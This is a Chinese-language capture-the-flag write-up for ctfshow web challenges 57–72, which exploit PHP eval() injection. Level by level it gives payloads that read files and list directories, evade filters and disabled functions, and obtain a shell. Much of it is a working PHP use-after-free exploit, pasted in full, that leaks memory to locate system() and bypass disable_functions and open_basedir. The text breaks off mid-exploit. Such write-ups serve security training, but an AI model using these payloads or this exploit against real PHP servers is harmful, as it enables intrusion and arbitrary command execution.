<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web57/%5BYB%29%7D%5BYR3LS3%60MH~%60XVE0P4.png" alt=""><br>
因为是cat命令，所以右键查看一下源码即可得到flag<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web57/%7DYV1%40J%28Y9HCI3OUEMBT0%5B17.png" alt=""></p>
<h3 id="web58"><a class="header-anchor" href="#web58">¶</a>web58</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>额，突然变简单了，这里可以直接蚁剑连接进去查看flag了(后面其实都可以使用蚁剑直接连接getshell)<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web58/B4A4VP%5BNJ%40B61F6R%407Z%604RY.png" alt=""><br>
不过应该是考读取文件的，我们使用读取文件函数进行读取flag，payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web58/W%25%29%7B%5BN%60~%40APWG58M5%603I6_2.png" alt=""><br>
这里补充一些读取文件函数的用法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">highlight_file($filename);</span><br><span class="line">show_source($filename);</span><br><span class="line">print_r(php_strip_whitespace($filename));</span><br><span class="line">print_r(file_get_contents($filename));</span><br><span class="line">readfile($filename);</span><br><span class="line">print_r(file($filename)); <span class="comment">// var_dump</span></span><br><span class="line">fread(fopen($filename,<span class="string">&quot;r&quot;</span>), $size);</span><br><span class="line"><span class="keyword">include</span>($filename); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">include_once</span>($filename); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">require</span>($filename); <span class="comment">// 非php代码</span></span><br><span class="line"><span class="keyword">require_once</span>($filename); <span class="comment">// 非php代码</span></span><br><span class="line">print_r(fread(popen(<span class="string">&quot;cat flag&quot;</span>, <span class="string">&quot;r&quot;</span>), $size));</span><br><span class="line">print_r(fgets(fopen($filename, <span class="string">&quot;r&quot;</span>))); <span class="comment">// 读取一行</span></span><br><span class="line">fpassthru(fopen($filename, <span class="string">&quot;r&quot;</span>)); <span class="comment">// 从当前位置一直读取到 EOF</span></span><br><span class="line">print_r(fgetcsv(fopen($filename,<span class="string">&quot;r&quot;</span>), $size));</span><br><span class="line">print_r(fgetss(fopen($filename, <span class="string">&quot;r&quot;</span>))); <span class="comment">// 从文件指针中读取一行并过滤掉 HTML 标记</span></span><br><span class="line">print_r(fscanf(fopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>),<span class="string">&quot;%s&quot;</span>));</span><br><span class="line">print_r(parse_ini_file($filename)); <span class="comment">// 失败时返回 false , 成功返回配置数组</span></span><br></pre></td></tr></table></figure>
<h3 id="web59"><a class="header-anchor" href="#web59">¶</a>web59</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码没变，应该是开始禁用了一些函数，考点应该开始是绕disable_functions了，show_source()没有被禁，继续使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web60"><a class="header-anchor" href="#web60">¶</a>web60</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>show_source()没有被禁，继续使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web61"><a class="header-anchor" href="#web61">¶</a>web61</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>show_source()没有被禁，继续使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web62"><a class="header-anchor" href="#web62">¶</a>web62</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>show_source()没有被禁，继续使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web63"><a class="header-anchor" href="#web63">¶</a>web63</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>show_source()没有被禁，继续使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web64"><a class="header-anchor" href="#web64">¶</a>web64</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>show_source()没有被禁，继续使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web65"><a class="header-anchor" href="#web65">¶</a>web65</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>show_source()没有被禁，继续使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web66"><a class="header-anchor" href="#web66">¶</a>web66</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>终于show_source()被禁止了，我们寻找新的读取文件函数，这里发现highlight_file()可以进行使用，构造payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;highlight_file(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>
<p>然而…<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web66/%7D_K%5DOYUZW9J8QDD0KB%5DHIZ9.png" alt=""><br>
说flag不在flag.php里，我们使用<code>?c=print_r(scandir(&quot;/&quot;));</code>打印一下根目录<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web66/%28D9PGWP%29L2CRP%5DEV%24%29%7DC7JX.png" alt=""><br>
发现有一个flag.txt，那我们直接读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;highlight_file(&quot;&#x2F;flag.txt&quot;);</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web66/NE58%40V%40%5B0O10J%7BFU%60%5B9YX_Y.png" alt=""></p>
<h3 id="web67"><a class="header-anchor" href="#web67">¶</a>web67</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这次打印目录发现<code>print_r()</code>被禁用了，那我们换成<code>var_dump</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;var_dump(scandir(&quot;&#x2F;&quot;));</span><br></pre></td></tr></table></figure>
<p>发现还是flag.txt，那直接上payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;highlight_file(&quot;&#x2F;flag.txt&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web68"><a class="header-anchor" href="#web68">¶</a>web68</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">无代码</span><br></pre></td></tr></table></figure>
<p>这次应该是吧highlight_file()给禁用了，所以页面连代码都没有，直接报错，先查看目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;var_dump(scandir(&quot;&#x2F;&quot;));</span><br></pre></td></tr></table></figure>
<p>还是flag.txt，这里highlight_file()被禁用，我们换另一个，使用include()函数，payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flag.txt&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web69"><a class="header-anchor" href="#web69">¶</a>web69</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">依然是highlight_file()被禁用不显示的源码</span><br></pre></td></tr></table></figure>
<p>查看目录时发现var_dump被禁用了，找了一下资料发现几种读取目录的方式</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">print_r(glob(<span class="string">&quot;*&quot;</span>)); <span class="comment">// 列当前目录</span></span><br><span class="line">print_r(glob(<span class="string">&quot;/*&quot;</span>)); <span class="comment">// 列根目录</span></span><br><span class="line">print_r(scandir(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">print_r(scandir(<span class="string">&quot;/&quot;</span>));</span><br><span class="line">$d=opendir(<span class="string">&quot;.&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==($f=readdir($d)))&#123;<span class="keyword">echo</span><span class="string">&quot;<span class="subst">$f</span>\n&quot;</span>;&#125;</span><br><span class="line">$d=dir(<span class="string">&quot;.&quot;</span>);<span class="keyword">while</span>(<span class="literal">false</span>!==($f=$d-&gt;read()))&#123;<span class="keyword">echo</span>$f.<span class="string">&quot;\n&quot;</span>;&#125;</span><br><span class="line">$a=glob(<span class="string">&quot;/*&quot;</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $value)&#123;<span class="keyword">echo</span> $value.<span class="string">&quot;   &quot;</span>;&#125;</span><br><span class="line">$a=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;glob:///*&#x27;</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;<span class="keyword">echo</span>($f-&gt;__toString().<span class="string">&quot; &quot;</span>);&#125;</span><br></pre></td></tr></table></figure>
<p>前面4个print_r都被禁用了，我们使用后面四个任意一个都可以，原理是通过遍历数组的形式进行读取</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$d&#x3D;opendir(&quot;..&#x2F;..&#x2F;..&#x2F;&quot;);while(false!&#x3D;&#x3D;($f&#x3D;readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>得到根目录下还是flag.txt，那直接上payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flag.txt&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web70"><a class="header-anchor" href="#web70">¶</a>web70</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">依然是highlight_file()被禁用不显示的源码</span><br></pre></td></tr></table></figure>
<p>读取目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$d&#x3D;opendir(&quot;..&#x2F;..&#x2F;..&#x2F;&quot;);while(false!&#x3D;&#x3D;($f&#x3D;readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>上payload获取flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flag.txt&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web71"><a class="header-anchor" href="#web71">¶</a>web71</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本来这次想直接用payload读取的，，结果😢</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flag.txt&quot;);</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web71/QN%29C%4081NPQF~C%5B5%60%7DI%402GMU.png" alt=""><br>
输出了一堆<code>?</code>号，看到源码中最后有个匹配，匹配到数字字母就会被替换成<code>?</code>号，不过因为这个语句是放在eval()函数后面的，我们直接加个强行退出命令即可，payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&quot;&#x2F;flag.txt&quot;);exit();</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web71/JJ%293IANL3BY%60LF9W2FOS%40JF.png" alt=""></p>
<h3 id="web72"><a class="header-anchor" href="#web72">¶</a>web72</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,$s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先继续先查看目录，上题的payload不能用了，继续换刚刚列举出来的另一个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web72/%28%296EFGFX3J%5BND58%256%7D5%281%60J.png" alt=""><br>
发现改名字了，flag在flag0.txt，继续include执行却发现被禁用了，接着悲催的发现这题有open_basedir和disable_functions的限制</p>
<blockquote>
<p>open_basedir：将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如fopen()或file_get_contents()打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开</p>
<p>disable_functions：用于禁止某些函数，也就是黑名单，简单来说就是php为了防止某些危险函数执行给出的配置项，默认情况下为空</p>
</blockquote>
<p>然后想上蚁剑也没有bypass成功，去网上搜了一下可利用的exp，正好群主有现成的发出来，直接拿来用<br>
exp：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params">$cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> $backtrace; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            $backtrace = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;getTrace();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>($backtrace[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params">$ptr, $m = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $out = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= sprintf(<span class="string">&quot;%c&quot;</span>,($ptr &amp; <span class="number">0xff</span>));</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;$str, $p, $v, $n = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = sprintf(<span class="string">&quot;%c&quot;</span>,($v &amp; <span class="number">0xff</span>));</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params">$addr, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params">$base</span>) </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; </span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params">$base, $elf</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params">$binary_leak</span>) </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params">$basic_funcs</span>) </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params">$arg</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        $arg = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        $vuln = <span class="keyword">new</span> Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; </span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    $abc = $backtrace[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> 